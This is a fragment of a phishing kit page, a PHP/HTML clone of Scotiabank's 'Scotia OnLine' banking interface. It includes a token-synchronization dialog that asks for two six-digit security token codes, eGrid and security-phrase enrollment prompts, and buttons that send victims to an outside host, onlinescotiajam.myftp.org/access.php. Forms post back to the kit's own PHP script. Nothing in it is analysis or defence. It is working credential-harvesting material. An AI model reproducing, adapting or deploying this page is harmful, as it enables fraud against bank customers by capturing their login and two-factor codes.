				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="cancelResetPasswordNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt327:cancelResetPasswordYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form>

		<div class="RUIFW-modal fade modal fade in modal fade" id="egrid_confirmation_popup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="egridpopupForm" name="egridpopupForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						<div class="pad-btm-10">???EGRID_DESC???</div>
					</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
                        <input id="egridpopupForm:supmitbtn" type="submit" name="egridpopupForm:supmitbtn" value="Ok" class="RUIFW-btn-primary btn btn-primary btn btn-primary">
					</div>
			</div>
		</div>
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="SignOnSyncTokenPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="syncTokenIncludeForm" name="syncTokenIncludeForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button><label id="syncTokenIncludeForm:myModalLabel" class="RUIFW-modal-title modal-title modal-title">Token Synchronization</label>
				</div>
				<div class="RUIFW-modal-body wrapfrom modal-body modal-body"><div id="syncTokenIncludeForm:tokenMessages" class="col-md-12 success-msg"></div><span id="syncTokenIncludeForm:firstSecond">
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-12 col-sm-12 col-sm-12">Your token needs to be synchronized before completing this transaction.							
							</div>
						</div>
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-12 mrgn-top-20 col-sm-12 col-sm-12">
								<label for="fts">First Token sequence</label><div id="syncTokenIncludeForm:token1" class="RUIFW-inline">
                                    <input id="syncTokenIncludeForm:tokenOne" type="password" name="syncTokenIncludeForm:tokenOne" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/token.png"></span></div>
								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
								<br>
							</div>
						</div>	
						<div class="RUIFW-row row row">
							<div class="RUIFW-col-6 col-sm-6 col-sm-6">
								<label for="sts">Second token sequence</label><div id="syncTokenIncludeForm:token2" class="RUIFW-inline">
                                    <input id="syncTokenIncludeForm:tokenTwo" type="password" name="syncTokenIncludeForm:tokenTwo" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/token.png"></span></div>
								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
							</div><span id="syncTokenIncludeForm:synchronizationSuccessField">
</span>
						</div></span>
				</div>
				<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
                    <input id="syncTokenIncludeForm:synchronizeCancelButton" type="submit" name="syncTokenIncludeForm:synchronizeCancelButton" value="Cancel" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:cancelSynchronize});return false">
                    <input id="syncTokenIncludeForm:synchronizeConfirmButton" type="submit" name="syncTokenIncludeForm:synchronizeConfirmButton" value="Synchronize" class="RUIFW-btn-primary btn btn-primary btn btn-primary" onclick="mojarra.ab(this,event,&#39;action&#39;,&#39;@form&#39;,&#39;syncTokenIncludeForm:token1 syncTokenIncludeForm:token2 syncTokenIncludeForm:tokenMessages syncTokenIncludeForm:synchronizationSuccessField&#39;,{&#39;onevent&#39;:afterTokenSync});return false">
				</div>
			</div>
	    </div>
</form>
       		
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="skipEnrollmentPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="skipegridpopupForm" name="skipegridpopupForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						Important! You must create a security phrase to use Scotia Online/Mobile. This phrase will be displayed for your verification every time you sign in as an added layer of security.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipegridpopupForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>
        
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="skipQuestionPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="skipSecurityQuestionPopup" name="skipSecurityQuestionPopup" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						You have chosen not to set your eGrid.  You will be asked to set your eGrid when you need to perform certain transactions such as adding a payee or a funds transfer recipient.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipSecurityQuestionPopup:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>
       
</form>
		</div>
		
		<div class="RUIFW-modal fade modal fade in modal fade" id="completeEnrollmentPopup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
<form id="completeEnrollmentForm" name="completeEnrollmentForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">


		<div class="RUIFW-modal-dialog modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
					</div>
					<div class="RUIFW-modal-body modal-body modal-body">
						You must download your eGrid before leaving this page. Please save, print or take a picture of your eGrid. You will need it when performing certain transactions such as setting up Bill Payments and Funds Transfers. Click "Cancel" to return to the previous page and download your eGrid or "OK" if you have already downloaded it.</div>
					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="completeEnrollmentForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
					</div>
				
			</div>
		</div>

</form>
		</div><div id="blkpush">
<form id="createUsernameModalWindowFormWrapper" name="createUsernameModalWindowFormWrapper" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">



	<div class="RUIFW-modal fade modal fade" id="modalCancelConfirmation" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
		
		<div class="RUIFW-modal-dialog modal-dialog modal-dialog">
			<div class="RUIFW-modal-content modal-content modal-content" role="document">
				<div class="RUIFW-modal-header modal-header">
					<button type="button" class="close_icon" data-dismiss="modal"></button>
					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
						<img src="http://localhost:8080/phpSite/scotis/./Scotia OnLine_files/scotiabank-group.gif">
					</h4>
				</div>
				
				<div class="RUIFW-modal-body modal-body"><span id="createUsernameModalWindowFormWrapper:modalCancelConfirmationmainMessageId">Are you sure you want to cancel the change? </span>
					<br>
					<br><span id="createUsernameModalWindowFormWrapper:modalCancelConfirmationsubMessageId"></span>
				</div>
				
				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
							<button id="modalCancelConfirmationNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="createUsernameModalWindowFormWrapper:modalCancelConfirmationYesButton" href="http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
				</div>
				
			</div>
		</div>
	</div>

</form></div>

<div class="RUIFW-calculator">          <div class="RUIFW-calculator-head">		  <div class="close"><span class="icon-remove-circle"></span></div>		  </div>          <input id="calculator-field" class="RUIFW-form-el form-control form-control" value="0" readonly=""><div id="calculator-getNumber" class="calc-getnumber-field"></div>          <div class="RUIFW-calculator-keys">            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">7</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">8</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">9</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> + </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">4</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">5</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">6</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> - </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">1</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">2</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">3</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> * </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">0</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-numb" type="button">.</button>              <button class="RUIFW-key btn btn-default" id="calcbtn-RESET" type="button">C</button>              <button class="RUIFW-key btn btn-default RUIFW-calculator-math" type="button"> / </button>            </div>            <div class="row-fluid">              <button class="RUIFW-key btn btn-primary calculator-btn" id="calcbtn-CALC" type="button">=</button>            </div>          </div></div><span class="RUIFW-media-type"></span>
</body></html>
